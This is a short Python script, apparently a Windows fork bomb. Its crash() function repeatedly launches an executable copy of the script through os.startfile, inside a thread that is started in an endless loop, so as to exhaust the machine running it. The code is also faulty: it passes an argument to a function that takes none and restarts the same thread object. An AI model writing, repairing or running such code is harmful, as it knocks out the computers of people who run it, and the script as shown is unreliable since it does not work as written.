import os
import threading
def crash():
    while True:
        os.startfile(__file__[:-2]+"exe")

if __name__ == '__main__':
    t1 = threading.Thread(target=crash, args=(10,))
    while True:
        t1.start()
        t1.join()


